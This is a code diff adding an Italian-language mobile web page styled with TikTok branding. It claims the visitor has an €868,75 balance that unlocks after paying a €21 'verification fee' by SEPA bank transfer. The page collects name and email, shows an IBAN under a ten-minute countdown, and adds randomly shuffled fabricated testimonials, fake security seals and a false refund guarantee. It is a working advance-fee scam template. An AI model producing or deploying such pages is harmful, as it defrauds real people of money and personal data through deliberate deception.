@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Checkout – Sblocco Saldo</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f2f2f2;max-width:420px;margin:0 auto;min-height:100vh;-webkit-font-smoothing:antialiased}
+.topbar{background:#ff2d55;color:white;text-align:center;padding:12px 16px;font-size:14px;font-weight:600}
+.container{padding:12px 12px 48px;display:flex;flex-direction:column;gap:10px}
+.saldo-card{background:#1c1c1e;border-radius:14px;padding:20px 18px;color:white}
+.saldo-label{font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:rgba(255,255,255,.5);margin-bottom:8px}
+.saldo-value{font-size:42px;font-weight:800;letter-spacing:-1px;margin-bottom:6px;line-height:1}
+.saldo-confirm{font-size:13px;font-weight:700;color:#ff4d67}
+.card{background:#fff;border-radius:14px;padding:16px 14px}
+.section-label{font-size:13px;color:#888;margin-bottom:12px}
+.confirm-row{display:flex;align-items:center;gap:12px;padding-bottom:14px;border-bottom:1px solid #f0f0f0;margin-bottom:12px}
+.tiktok-icon-wrap{width:44px;height:44px;border-radius:12px;background:#000;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.confirm-name{font-size:15px;font-weight:600;color:#111;margin-bottom:3px}
+.confirm-price{font-size:15px;font-weight:700;color:#00b37e}
+.total-row{display:flex;justify-content:space-between;align-items:center;padding-top:4px}
+.total-label,.total-value{font-size:15px;font-weight:700;color:#111}
+.libera-badge{background:#e6faf4;border:1px solid #b2f0dc;border-radius:8px;padding:8px 12px;font-size:12.5px;font-weight:600;color:#057a55;text-align:center;margin-top:10px}
+.card-header{display:flex;align-items:center;gap:10px;margin-bottom:16px}
+.card-header-icon{width:36px;height:36px;border-radius:50%;background:#ff2d55;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card-header h2{font-size:17px;font-weight:700;color:#111}
+.field{margin-bottom:12px}
+.field:last-child{margin-bottom:0}
+.field label{display:block;font-size:13px;color:#555;margin-bottom:6px}
+.field input{width:100%;padding:13px 14px;border:1px solid #e0e0e0;border-radius:8px;font-size:15px;font-family:inherit;color:#111;background:#fff;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#ff2d55;box-shadow:0 0 0 3px rgba(255,45,85,.1)}
+.field input::placeholder{color:#bbb}
+.field input.error{border-color:#ff2d55;box-shadow:0 0 0 3px rgba(255,45,85,.1);animation:shake .3s ease}
+.field-error-msg{font-size:11px;color:#ff2d55;font-weight:600;margin-top:4px;display:none}
+.field input.error + .field-error-msg{display:block}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+.btn-pagar{display:flex;width:100%;padding:16px;background:#ff2d55;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;font-family:inherit;letter-spacing:.5px;cursor:pointer;text-align:center;text-transform:uppercase;margin-bottom:10px;transition:background .15s;align-items:center;justify-content:center;gap:10px}
+.btn-pagar:hover{background:#e8003d}
+.btn-pagar:active{background:#cc0033}
+.btn-pagar.loading{background:#cc1f3f;cursor:not-allowed;pointer-events:none}
+.spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:white;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.btn-pagar.loading .spinner{display:block}
+@keyframes spin{to{transform:rotate(360deg)}}
+.pay-note{text-align:center;font-size:12.5px;color:#888}
+.pay-note strong{color:#111}
+.seals{background:#fff;border-radius:14px;padding:14px 16px;display:flex;align-items:center;justify-content:center}
+.seal{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1}
+.seal-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center}
+.seal-icon.green{background:#e6faf4}.seal-icon.blue{background:#e8f0fe}.seal-icon.amber{background:#fff8e1}
+.seal-text{font-size:10.5px;font-weight:700;color:#555;text-align:center;line-height:1.3}
+.seal-divider{width:1px;height:40px;background:#f0f0f0;flex-shrink:0}
+.footer-note{text-align:center;font-size:12px;color:#aaa;padding:0 8px;line-height:1.6}
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s ease}
+.modal-overlay.active{opacity:1;pointer-events:all}
+.modal{background:#fff;border-radius:20px 20px 0 0;padding:28px 22px 36px;width:100%;max-width:480px;position:relative;text-align:center;transform:translateY(100%);transition:transform .3s cubic-bezier(.32,.72,0,1);overflow-y:auto;max-height:92vh}
+.modal-overlay.active .modal{transform:translateY(0)}
+.modal-handle{width:40px;height:4px;background:#e0e0e0;border-radius:4px;margin:0 auto 18px}
+.modal-close{position:absolute;top:14px;right:16px;width:28px;height:28px;background:#f2f2f2;border:none;border-radius:50%;cursor:pointer;font-size:16px;color:#888}
+.modal-check{width:52px;height:52px;border-radius:50%;border:2.5px solid #00b37e;display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
+.modal-title{font-size:18px;font-weight:800;color:#111;margin-bottom:2px}
+.modal-subtitle{font-size:13px;color:#888;margin-bottom:16px}
+.modal-value{font-size:22px;font-weight:800;color:#111;margin-bottom:18px}
+.timer-wrap{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px}
+.timer-label{font-size:12px;color:#999}
+.timer-count{font-size:20px;font-weight:800;color:#00b37e;font-variant-numeric:tabular-nums}
+.timer-count.urgent{color:#e63946}
+.timer-bar-wrap{width:100%;height:4px;background:#f0f0f0;border-radius:4px;margin-bottom:16px;overflow:hidden}
+.timer-bar{height:100%;background:#00b37e;border-radius:4px;transition:width 1s linear,background .3s}
+.timer-bar.urgent{background:#e63946}
+.how-to-copy{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
+.how-step-row{display:flex;align-items:center;gap:10px}
+.how-step-num{width:24px;height:24px;border-radius:50%;background:#f0faf6;border:1.5px solid #c8edd9;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#00b37e;flex-shrink:0}
+.how-step-desc{font-size:12.5px;color:#555;font-weight:500;line-height:1.35}
+.how-step-desc strong{color:#111}
+.iban-code-row{display:flex;align-items:center;gap:8px;background:#f8f8f8;border:1px solid #eee;border-radius:8px;padding:10px 12px;margin-bottom:14px}
+.iban-code-text{flex:1;font-size:12px;color:#555;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:left;font-family:monospace}
+.copy-btn{background:none;border:none;cursor:pointer;color:#888;padding:2px;flex-shrink:0;transition:color .15s}
+.copy-btn:hover{color:#00b37e}
+.btn-copiar{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:15px;background:#00b37e;color:white;border:none;border-radius:10px;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;margin-bottom:10px;transition:background .15s}
+.btn-copiar:hover{background:#009e6e}
+.btn-copiar.copied{background:#057a55}
+.mini-depos{display:flex;flex-direction:column;gap:5px;margin:10px 0 8px}
+.mini-depo{display:flex;align-items:center;gap:8px;background:#f8f8f8;border-radius:8px;padding:8px 10px}
+.mini-depo-av{width:28px;height:28px;border-radius:50%;font-size:10px;font-weight:700;color:white;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.mini-depo-text{flex:1;font-size:12.5px;color:#444;font-style:italic;line-height:1.4}
+.mini-depo-check{font-size:11px;font-weight:700;color:#00b37e;white-space:nowrap;flex-shrink:0}
+.modal-note{font-size:11.5px;color:#aaa;line-height:1.5}
+#toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-120px);background:#1a1a2e;color:white;padding:14px 20px;border-radius:12px;font-size:14px;font-weight:600;z-index:999999;transition:transform .3s ease;display:flex;align-items:center;gap:8px;box-shadow:0 6px 24px rgba(0,0,0,.3);width:calc(100% - 32px);max-width:388px}
+#toast.show{transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+<div id="toast"><span id="toastMsg">Compila tutti i campi per continuare</span></div>
+<div class="topbar">Pagamento Sicuro e Veloce</div>
+<div class="container">
+
+  <div class="saldo-card">
+    <p class="saldo-label">Il tuo saldo disponibile</p>
+    <div class="saldo-value" id="saldoValue">€868,75</div>
+    <div class="saldo-confirm">✓ Saldo selezionato per il prelievo</div>
+  </div>
+
+  <div class="card">
+    <p class="section-label">Riepilogo:</p>
+    <div class="confirm-row">
+      <div class="tiktok-icon-wrap">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.22 8.22 0 004.84 1.56V6.79a4.85 4.85 0 01-1.07-.1z"/></svg>
+      </div>
+      <div>
+        <p class="confirm-name">Quota di Verifica</p>
+        <p class="confirm-price" id="priceConfirm">€ 21,00</p>
+      </div>
+    </div>
+    <div class="total-row">
+      <span class="total-label">Totale:</span>
+      <span class="total-value" id="priceTotal">€ 21,00</span>
+    </div>
+    <div class="libera-badge">✅ Paga e sblocca immediatamente <strong id="saldoBadge">€868,75</strong></div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      </div>
+      <h2>Identificati</h2>
+    </div>
+    <div class="field">
+      <label>Nome completo</label>
+      <input type="text" id="inputNome" placeholder="Il tuo nome completo" autocomplete="name"/>
+      <span class="field-error-msg">Inserisci il tuo nome completo</span>
+    </div>
+    <div class="field">
+      <label>E-mail</label>
+      <input type="email" id="inputEmail" placeholder="tua@email.com" autocomplete="email"/>
+      <span class="field-error-msg">Inserisci un'e-mail valida</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+      </div>
+      <h2>Pagamento</h2>
+    </div>
+    <button class="btn-pagar" id="btnPagar">
+      <div class="spinner"></div>
+      <span class="btn-text">Paga Ora</span>
+    </button>
+    <p class="pay-note">Pagamento sicuro via <strong>Bonifico / SEPA</strong> con approvazione immediata.</p>
+  </div>
+
+  <div class="seals">
+    <div class="seal"><div class="seal-icon green"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="seal-text">Acquisto<br>Sicuro</span></div>
+    <div class="seal-divider"></div>
+    <div class="seal"><div class="seal-icon blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div><span class="seal-text">Dati<br>Protetti</span></div>
+    <div class="seal-divider"></div>
+    <div class="seal"><div class="seal-icon amber"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div><span class="seal-text">Rimborso<br>7 giorni</span></div>
+  </div>
+
+  <p class="footer-note">Acquisto 100% sicuro. Rimborso garantito entro 7 giorni.</p>
+</div>
+
+<!-- Modal pagamento -->
+<div class="modal-overlay" id="pixModal">
+  <div class="modal">
+    <div class="modal-handle"></div>
+    <button class="modal-close" id="modalClose">✕</button>
+    <div class="modal-check">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h2 class="modal-title">Pagamento Generato!</h2>
+    <p class="modal-subtitle" id="modalSubtitle">Ciao, <strong id="nomeModal">–</strong>! Copia il codice IBAN qui sotto.</p>
+    <p class="modal-value" id="priceModal">€ 21,00</p>
+    <div class="timer-wrap">
+      <span class="timer-label">Tempo rimasto:</span>
+      <span class="timer-count" id="timerCount">10:00</span>
+    </div>
+    <div class="timer-bar-wrap"><div class="timer-bar" id="timerBar" style="width:100%"></div></div>
+    <div class="how-to-copy">
+      <div class="how-step-row"><div class="how-step-num">1</div><p class="how-step-desc">Apri l'app della tua banca e vai su <strong>Bonifico</strong></p></div>
+      <div class="how-step-row"><div class="how-step-num">2</div><p class="how-step-desc">Scegli <strong>Trasferimento SEPA</strong></p></div>
+      <div class="how-step-row"><div class="how-step-num">3</div><p class="how-step-desc">Clicca su <strong>Copia Codice IBAN</strong> qui sotto e incollalo nella tua banca</p></div>
+      <div class="how-step-row"><div class="how-step-num">4</div><p class="how-step-desc">Verifica l'importo di <strong id="priceStep">€ 21,00</strong> e conferma</p></div>
+    </div>
+    <div class="iban-code-row">
+      <span class="iban-code-text" id="ibanCodeText">Generazione codice...</span>
+      <button class="copy-btn" id="copyCodeBtn" title="Copia codice">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+      </button>
+    </div>
+    <button class="btn-copiar" id="btnCopiar">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+      Copia Codice IBAN
+    </button>
+    <div class="mini-depos" id="miniDepos"></div>
+    <p class="modal-note">Dopo il pagamento riceverai la conferma immediatamente su questo dispositivo.</p>
+  </div>
+</div>
+
+<script>
+(function(){
+  var params     = new URLSearchParams(window.location.search);
+  var totalParam = parseFloat(params.get('total')) || 868.75;
+  var taxaParam  = parseFloat(params.get('taxa'))  || 21.36;
+
+  function fmt(v){ return '€ ' + v.toFixed(2).replace('.',','); }
+  function fmtS(v){ return '€' + v.toFixed(2).replace('.',','); }
+
+  document.getElementById('saldoValue').textContent   = fmtS(totalParam);
+  document.getElementById('saldoBadge').textContent   = fmtS(totalParam);
+  document.getElementById('priceConfirm').textContent = fmt(taxaParam);
+  document.getElementById('priceTotal').textContent   = fmt(taxaParam);
+  document.getElementById('priceModal').textContent   = fmt(taxaParam);
+  document.getElementById('priceStep').textContent    = fmt(taxaParam);
+
+  var allDepos = [
+    {av:'GL',bg:'#e05252',txt:'"Arrivato sul mio conto in meno di 2 minuti."'},
+    {av:'MR',bg:'#00b37e',txt:'"Processo semplice e sicuro. Consigliato!"'},
+    {av:'SF',bg:'#5a6fd6',txt:'"Ha funzionato perfettamente al primo tentativo."'},
+    {av:'AP',bg:'#f59e0b',txt:'"Velocissimo, lo consiglio a tutti."'},
+    {av:'LC',bg:'#8b5cf6',txt:'"Nessun problema, pagamento confermato subito."'},
+    {av:'VB',bg:'#ec4899',txt:'"Procedura semplice e sicura. Approvato!"'},
+  ];
+
+  function renderDepos(){
+    var shuffled = allDepos.sort(function(){ return Math.random()-.5; }).slice(0,3);
+    document.getElementById('miniDepos').innerHTML = shuffled.map(function(d){
+      return '<div class="mini-depo"><div class="mini-depo-av" style="background:'+d.bg+'">'+d.av+'</div>'+
+             '<span class="mini-depo-text">'+d.txt+'</span>'+
+             '<span class="mini-depo-check">✅ Confermato</span></div>';
+    }).join('');
+  }
+  renderDepos();
+
+  // IBAN fittizio para demo (seria gerado por backend real)
+  var IBAN_CODE = 'IT60 X054 2811 1010 0000 00' + Math.floor(10000+Math.random()*89999);
+  var timerInterval = null;
+  var TOTAL_SECONDS = 10*60, remainingSeconds = TOTAL_SECONDS;
+
+  function pad(n){ return String(n).padStart(2,'0'); }
+
+  var toastTimeout;
+  function showToast(msg){
+    var el=document.getElementById('toast');
+    document.getElementById('toastMsg').textContent=msg;
+    clearTimeout(toastTimeout);
+    el.classList.remove('show');
+    setTimeout(function(){el.classList.add('show');toastTimeout=setTimeout(function(){el.classList.remove('show');},3000);},10);
+  }
+
+  function startTimer(){
+    var countEl=document.getElementById('timerCount'),barEl=document.getElementById('timerBar');
+    remainingSeconds=TOTAL_SECONDS;
+    if(timerInterval) clearInterval(timerInterval);
+    timerInterval=setInterval(function(){
+      remainingSeconds--;
+      if(remainingSeconds<=0){remainingSeconds=0;clearInterval(timerInterval);}
+      var m=Math.floor(remainingSeconds/60),s=remainingSeconds%60;
+      countEl.textContent=pad(m)+':'+pad(s);
+      var urgent=remainingSeconds<300;
+      countEl.classList.toggle('urgent',urgent);barEl.classList.toggle('urgent',urgent);
+      barEl.style.width=(remainingSeconds/TOTAL_SECONDS*100)+'%';
+    },1000);
+  }
+
+  function openModal(nome){
+    document.getElementById('nomeModal').textContent = nome;
+    document.getElementById('ibanCodeText').textContent = IBAN_CODE;
+    document.getElementById('pixModal').classList.add('active');
+    document.body.classList.add('modal-open');
+    startTimer();
+  }
+
+  document.getElementById('modalClose').addEventListener('click', function(){
+    document.getElementById('pixModal').classList.remove('active');
+    document.body.classList.remove('modal-open');
+    if(timerInterval) clearInterval(timerInterval);
+  });
+
+  document.getElementById('copyCodeBtn').addEventListener('click', function(){
+    navigator.clipboard.writeText(IBAN_CODE).then(function(){
+      showToast('✅ Codice IBAN copiato!');
+    });
+  });
+
+  document.getElementById('btnCopiar').addEventListener('click', function(){
+    navigator.clipboard.writeText(IBAN_CODE).then(function(){
+      var btn=document.getElementById('btnCopiar');
+      btn.classList.add('copied');
+      btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Codice Copiato!';
+      showToast('✅ Codice IBAN copiato negli appunti!');
+      setTimeout(function(){
+        btn.classList.remove('copied');
+        btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copia Codice IBAN';
+      }, 3000);
+    });
+  });
+
+  document.getElementById('inputNome').addEventListener('blur', function(){
+    if(this.value.trim().length<2) this.classList.add('error'); else this.classList.remove('error');
+  });
+  document.getElementById('inputNome').addEventListener('focus', function(){ this.classList.remove('error'); });
+
+  document.getElementById('btnPagar').addEventListener('click', function(){
+    var nome=document.getElementById('inputNome');
+    var emailEl=document.getElementById('inputEmail');
+    nome.classList.remove('error'); emailEl.classList.remove('error');
+    var ok=true;
+    if(nome.value.trim().length<2){ nome.classList.add('error'); ok=false; }
+    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailEl.value.trim())){ emailEl.classList.add('error'); ok=false; }
+    if(!ok){
+      showToast('📋 Compila tutti i campi correttamente');
+      document.querySelector('.field input.error').scrollIntoView({behavior:'smooth',block:'center'});
+      return;
+    }
+    var btn=document.getElementById('btnPagar');
+    btn.classList.add('loading');
+    btn.querySelector('.btn-text').textContent='Generazione pagamento...';
+    setTimeout(function(){
+      btn.classList.remove('loading');
+      btn.querySelector('.btn-text').textContent='Paga Ora';
+      openModal(nome.value.trim());
+    }, 1200);
+  });
+})();
+</script>
+</body>
+</html>
